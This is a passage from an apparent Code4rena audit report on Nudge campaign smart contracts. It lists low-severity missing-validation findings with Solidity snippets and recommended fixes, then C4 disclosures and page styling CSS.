functioncreatePointsCampaign(uint256campaignId,uint32holdingPeriodInSeconds,addresstargetToken) externalonlyRole(NUDGE_ADMIN_ROLE) returns (Campaignmemory) {if (targetToken == address(0)) {revertInvalidTargetToken(); }// Add validation for holding periodif (holdingPeriodInSeconds == 0) {revertInvalidHoldingPeriod(); }if (campaigns[campaignId].targetToken != address(0)) {revertCampaignAlreadyExists(); }campaigns[campaignId] = Campaign({targetToken:targetToken,totalReallocatedAmount:0,holdingPeriodInSeconds:holdingPeriodInSeconds,pID:0 });emitPointsCampaignCreated(campaignId, holdingPeriodInSeconds, targetToken);returncampaigns[campaignId];}
```

For `createPointsCampaigns`:

```
functioncreatePointsCampaigns(uint256[] calldatacampaignIds,uint32[] calldataholdingPeriodsInSeconds,address[] calldatatargetTokens) externalonlyRole(NUDGE_ADMIN_ROLE) returns (Campaign[] memory) {for (uint256i = 0; i < campaignIds.length; i++) {if (targetTokens[i] == address(0)) {revertInvalidTargetToken(); }// Add validation for holding periodif (holdingPeriodsInSeconds[i] == 0) {revertInvalidHoldingPeriod(); }if (campaigns[campaignIds[i]].targetToken != address(0)) {revertCampaignAlreadyExists(); }campaigns[campaignIds[i]] = Campaign({targetToken:targetTokens[i],totalReallocatedAmount:0,holdingPeriodInSeconds:holdingPeriodsInSeconds[i],pID:0 });emitPointsCampaignCreated(campaignIds[i], holdingPeriodsInSeconds[i], targetTokens[i]); }returncampaigns;}
```

Also, add the custom error definition at the contract level:

```
errorInvalidHoldingPeriod();
```

### References

- NudgeCampaignFactory.sol implements similar validation in line 80: `if (holdingPeriodInSeconds == 0) revert InvalidParameter();`

- `createPointsCampaign`

- `createPointsCampaigns`

## [02] Missing target and reward token uniqueness check in campaign deployment

The NudgeCampaignFactory contract lacks validation to prevent using the same token address for both the target token and the reward token when deploying campaigns. This could lead to unexpected behavior and confusion for users.

### Vulnerability Details

When deploying a campaign through `deployCampaign` and `deployAndFundCampaign` functions, there is no check to ensure that the `targetToken` and `rewardToken` parameters are different addresses. While both addresses are validated to be non-zero, the contract allows them to be identical.

This could result in a campaign where users are required to hold a token and are rewarded with the same token, potentially creating circular dependency issues or unexpected incentive structures.

### Impact

- Creates confusing incentive mechanisms where the same token is both required for eligibility and given as a reward.

- May result in logical inconsistencies in campaign operations.

- Could lead to unexpected behavior during reward calculations and distributions.

- Diverges from the intended separation of target and reward tokens in the protocol design.

### Proof of Concept

In NudgeCampaignFactory.sol:

```
functiondeployCampaign(uint32holdingPeriodInSeconds,addresstargetToken,addressrewardToken,uint256rewardPPQ,addresscampaignAdmin,uint256startTimestamp,addressalternativeWithdrawalAddress,uint256uuid) publicreturns (addresscampaign) {if (campaignAdmin == address(0)) revertZeroAddress();if (targetToken == address(0) || rewardToken == address(0)) revertZeroAddress();if (holdingPeriodInSeconds == 0) revertInvalidParameter();// No check that targetToken != rewardToken// ...}
```

### Recommended mitigation steps

Add a validation check in both `deployCampaign` and `deployAndFundCampaign` functions to ensure the target and reward tokens are different:

```
// Add to deployCampaign functionif (targetToken == rewardToken) revertSameTokenForTargetAndReward();
```

Also, add the corresponding error definition:

```
errorSameTokenForTargetAndReward();
```

### References

- `deployCampaign`

- `deployAndFundCampaign`

## [03] Missing UUID uniqueness validation in campaign deployment

The NudgeCampaignFactory does not validate the uniqueness of campaign UUIDs during deployment, potentially allowing multiple campaigns with the same identifier.

### Vulnerability Details

When deploying campaigns through `deployCampaign` and `deployAndFundCampaign` functions, there is no check to ensure that the provided `uuid` parameter is unique across all campaigns. This could lead to multiple campaigns sharing the same identifier.

While the CREATE2 deployment pattern ensures unique contract addresses due to other parameters in the salt calculation, having unique UUID’s is important for off-chain tracking and integration systems that may rely on these identifiers.

### Impact

- Multiple campaigns could share the same UUID, causing confusion in off-chain systems.

- Could lead to errors in campaign tracking or analytics that rely on UUID uniqueness.

- May impact integrations with external systems that expect UUIDs to be unique identifiers.

### Proof of Concept

In NudgeCampaignFactory.sol:

```
functiondeployCampaign(uint32holdingPeriodInSeconds,addresstargetToken,addressrewardToken,uint256rewardPPQ,addresscampaignAdmin,uint256startTimestamp,addressalternativeWithdrawalAddress,uint256uuid) publicreturns (addresscampaign) {if (campaignAdmin == address(0)) revertZeroAddress();if (targetToken == address(0) || rewardToken == address(0)) revertZeroAddress();if (holdingPeriodInSeconds == 0) revertInvalidParameter();// No validation that uuid is unique// ...}
```

### Recommended mitigation steps

Implement a mapping to track used UUIDs and add a validation check in campaign deployment functions:

```
// Add to contract state variablesmapping(uint256=>bool) publicusedUUIDs;// Add to deployCampaign functionif (usedUUIDs[uuid]) revertDuplicateUUID();usedUUIDs[uuid] = true;
```

Also, add the corresponding error definition:

```
errorDuplicateUUID();
```

### References

- `deployCampaign`

- `deployAndFundCampaign`

## [04] Initial reward amount not validated in `DeployAndFundCampaign` function

The `deployAndFundCampaign` function in the NudgeCampaignFactory contract doesn’t validate that the `initialRewardAmount` is greater than zero; potentially allowing campaigns to be created with zero initial funding.

### Vulnerability Details

When a campaign is deployed and funded using the `deployAndFundCampaign` function, there is no check to ensure that `initialRewardAmount` is greater than zero. This could result in campaigns being created with zero initial rewards, which contradicts the purpose of a funding function.

### Impact

- Campaigns could be deployed with zero initial funding despite using a specific funding function.

- Could cause confusion for campaign administrators who expect the funding to occur.

- May result in campaigns being unable to distribute rewards until separately funded.

- Creates an inconsistent pattern where the “fund” function doesn’t actually require funding.

### Proof of Concept

In NudgeCampaignFactory.sol:

```
functiondeployAndFundCampaign(uint32holdingPeriodInSeconds,addresstargetToken,addressrewardToken,uint256rewardPPQ,addresscampaignAdmin,uint256startTimestamp,addressalternativeWithdrawalAddress,uint256initialRewardAmount,uint256uuid) externalpayablereturns (addresscampaign) {if (campaignAdmin == address(0)) revertZeroAddress();if (targetToken == address(0) || rewardToken == address(0)) revertZeroAddress();if (holdingPeriodInSeconds == 0) revertInvalidParameter();// No check that initialRewardAmount > 0// ...}
```

### Recommended mitigation steps

Add a validation check to ensure the initial reward amount is greater than zero:

```
// Add to deployAndFundCampaign functionif (initialRewardAmount == 0) revertZeroRewardAmount();
```

Also, add the corresponding error definition:

```
errorZeroRewardAmount();
```

### References

`deployAndFundCampaign`

## [05] Missing `rewardPPQ` validation in campaign deployment functions

The `deployCampaign` and `deployAndFundCampaign` functions in the NudgeCampaignFactory contract do not validate that the `rewardPPQ` parameter is greater than zero and less than `PPQ_DENOMINATOR`; potentially allowing campaigns to be created with zero or excessive rewards.

### Vulnerability Details

The `rewardPPQ` parameter represents the reward factor in parts per quadrillion (PPQ) used to calculate campaign rewards. This critical parameter lacks validation in both deployment functions.

When `rewardPPQ` is zero, the campaign would function normally but would never distribute any rewards to participants, as the reward calculation would always result in zero. This creates a dysfunctional campaign that contradicts the core purpose of the protocol.

Additionally, if `rewardPPQ` is equal to or greater than `PPQ_DENOMINATOR` (`1e15`), rewards would be equal to or greater than the original amount allocated, which could lead to excessive and potentially unsustainable reward distributions.

### Impact

- Campaigns could be deployed with zero reward rates, resulting in users participating but receiving no rewards.

- Campaigns could be deployed with excessively high reward rates (`≥100%`), leading to potentially unsustainable economic models.

- Creates potential for misleading campaigns where users participate expecting reasonable rewards but receive none or excessive amounts.

- Could damage user trust in the protocol if users don’t understand why they aren’t receiving expected rewards.

- Wastes gas and resources on campaigns that don’t fulfill their intended purpose.

### Proof of Concept

In NudgeCampaignFactory.sol:

```
functiondeployCampaign(uint32holdingPeriodInSeconds,addresstargetToken,addressrewardToken,uint256rewardPPQ,addresscampaignAdmin,uint256startTimestamp,addressalternativeWithdrawalAddress,uint256uuid) publicreturns (addresscampaign) {if (campaignAdmin == address(0)) revertZeroAddress();if (targetToken == address(0) || rewardToken == address(0)) revertZeroAddress();if (holdingPeriodInSeconds == 0) revertInvalidParameter();// No validation that rewardPPQ > 0 and rewardPPQ < PPQ_DENOMINATOR// ...}
```

The impact can be seen in NudgeCampaign.sol where rewards are calculated:

```
functiongetRewardAmountIncludingFees(uint256toAmount) publicviewreturns (uint256) {// If rewardPPQ is 0, this will always return 0 rewards// If rewardPPQ >= PPQ_DENOMINATOR (1e15), rewards will be >= 100% of toAmountreturntoAmount.mulDiv(rewardPPQ, PPQ_DENOMINATOR);}
```

### Recommended mitigation steps

Add validation checks in both campaign deployment functions to ensure the reward rate is within valid bounds:

```
// Add to deployCampaign functionif (rewardPPQ == 0) revertZeroRewardRate();if (rewardPPQ >= PPQ_DENOMINATOR) revertExcessiveRewardRate();
```

Also, add the corresponding error definitions:

```
errorZeroRewardRate();errorExcessiveRewardRate();
```

### References

- `deployCampaign`

- `deployAndFundCampaign`

- `getRewardAmountIncludingFees`

- `PPQ_DENOMINATOR` definition

## [06] Missing campaign existence check in `handleReallocation` function

The `handleReallocation` function in the NudgePointsCampaigns contract does not validate whether the specified campaign exists before proceeding with operations. This oversight allows interaction with non-existent campaigns, potentially leading to silent failures.

### Vulnerability Details

In the NudgePointsCampaigns contract, when the `handleReallocation` function is called with a non-existent campaign ID, it retrieves a default empty Campaign struct with zero values. The function then proceeds with operations on this empty struct instead of reverting.

The absence of an existence check means:

- The function continues execution with default values for campaign parameters.

- This will result in a silent failure while transferring tokens.

### Proof of Concept

In NudgePointsCampaigns.sol, the `handleReallocation` function loads the campaign without verifying its existence:

```
functionhandleReallocation(uint256campaignId,addressuserAddress,addresstoToken,uint256toAmount,bytescalldatadata) externalpayablewhenNotPaused(campaignId) onlyRole(SWAP_CALLER_ROLE) {Campaignstoragecampaign = campaigns[campaignId];// No validation that campaign exists!if (toToken != campaign.targetToken) {revertInvalidToTokenReceived(toToken); }// If campaign doesn't exist, campaign.targetToken will be address(0)// Further operations would use default zero values// ...}
```

### Recommended mitigation steps

Add a validation check at the beginning of the function to ensure the campaign exists:

```
functionhandleReallocation(uint256campaignId,addressuserAddress,addresstoToken,uint256toAmount,bytescalldatadata) externalpayablewhenNotPaused(campaignId) onlyRole(SWAP_CALLER_ROLE) {Campaignstoragecampaign = campaigns[campaignId];// Verify the campaign exists before proceedingif (campaign.targetToken == address(0)) {revertCampaignDoesNotExist(); }if (toToken != campaign.targetToken) {revertInvalidToTokenReceived(toToken); }// Continue with existing implementation// ...}
```

This check uses the same pattern established in other parts of the codebase, where a campaign’s existence is determined by its targetToken being non-zero.

### References

`handleReallocation`

## [07] Missing `rescueTokens` function in NudgePointsCampaigns contract

The NudgePointsCampaigns contract lacks a `rescueTokens` function, unlike the NudgeCampaign contract. This prevents administrators from recovering tokens that may be accidentally sent to the contract, potentially resulting in permanently locked funds.

### Vulnerability Details

The NudgeCampaign contract includes a `rescueTokens` function that allows administrators to retrieve tokens accidentally sent to the contract. However, this functionality is missing from the NudgePointsCampaigns contract.

Without this function:

- Tokens mistakenly sent to the NudgePointsCampaigns contract may be permanently locked.

- There’s no emergency mechanism to recover funds in case of user errors.

- The contract design is inconsistent with other contracts in the protocol.

### Proof of Concept

NudgeCampaign.sol implements the `rescueTokens` function:

```
functionrescueTokens(addresstoken) externalreturns (uint256amount) {if (!factory.hasRole(factory.NUDGE_ADMIN_ROLE(), msg.sender)) {revertUnauthorized(); }if (token == rewardToken) {revertCannotRescueRewardToken(); }amount = getBalanceOfSelf(token);if (amount > 0) {_transfer(token, msg.sender, amount);emitTokensRescued(token, amount); }returnamount;}
```

However, NudgePointsCampaigns.sol lacks this functionality, creating inconsistency and a potential risk of locked tokens.

### Recommended mitigation steps

Implement a similar `rescueTokens` function in the NudgePointsCampaigns contract:

```
/// @notice Rescues tokens that were mistakenly sent to the contract/// @param token Address of token to rescue/// @dev Only callable by NUDGE_ADMIN_ROLE/// @return amount Amount of tokens rescuedfunctionrescueTokens(addresstoken) externalonlyRole(NUDGE_ADMIN_ROLE) returns (uint256amount) {amount = getBalanceOfSelf(token);if (amount > 0) {_transfer(token, msg.sender, amount);emitTokensRescued(token, amount); }returnamount;}/// @notice Emitted when tokens are rescued from the contract/// @param token Address of the rescued token/// @param amount Amount of tokens rescuedeventTokensRescued(addressindexedtoken, uint256amount);
```

The implementation should be added to the ADMIN FUNCTIONS section of the NudgePointsCampaigns contract.

### References

- NudgePointsCampaigns.sol

- NudgeCampaign.sol `rescueTokens`

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.

 .grvsc-container {
 overflow: auto;
 position: relative;
 -webkit-overflow-scrolling: touch;
 padding-top: 1rem;
 padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));
 padding-bottom: 1rem;
 padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));
 border-radius: 8px;
 border-radius: var(--grvsc-border-radius, 8px);
 font-feature-settings: normal;
 line-height: 1.4;
 }
 
 .grvsc-code {
 display: table;
 }
 
 .grvsc-line {
 display: table-row;
 box-sizing: border-box;
 width: 100%;
 position: relative;
 }
 
 .grvsc-line > * {
 position: relative;
 }
 
 .grvsc-gutter-pad {
 display: table-cell;
 padding-left: 0.75rem;
 padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);
 }
 
 .grvsc-gutter {
 display: table-cell;
 -webkit-user-select: none;
 -moz-user-select: none;
 user-select: none;
 }
 
 .grvsc-gutter::before {
 content: attr(data-content);
 }
 
 .grvsc-source {
 display: table-cell;
 padding-left: 1.5rem;
 padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));
 padding-right: 1.5rem;
 padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));
 }
 
 .grvsc-source:empty::after {
 content: ' ';
 -webkit-user-select: none;
 -moz-user-select: none;
 user-select: none;
 }
 
 .grvsc-gutter + .grvsc-source {
 padding-left: 0.75rem;
 padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);
 }
 
 /* Line transformer styles */
 
 .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {
 content: ' ';
 position: absolute;
 width: 100%;
 }
 
 .grvsc-line-diff-add::before {
 background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));
 }
 
 .grvsc-line-diff-del::before {
 background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));
 }
 
 .grvsc-line-number {
 padding: 0 2px;
 text-align: right;
 opacity: 0.7;
 }
 
 .dark-default-dark {
 background-color: #1E1E1E;
 color: #D4D4D4;
 }
 .dark-default-dark .mtk3 { color: #6A9955; }
 .dark-default-dark .mtk12 { color: #9CDCFE; }
 .dark-default-dark .mtk1 { color: #D4D4D4; }
 .dark-default-dark .mtk7 { color: #B5CEA8; }
 .dark-default-dark .mtk15 { color: #C586C0; }
 .dark-default-dark .mtk8 { color: #CE9178; }
 .dark-default-dark .mtk4 { color: #569CD6; }
 .dark-default-dark .mtk10 { color: #4EC9B0; }
 .dark-default-dark .mtk11 { color: #DCDCAA; }
 .dark-default-dark .grvsc-line-highlighted::before {
 background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));
 box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));
 }
Top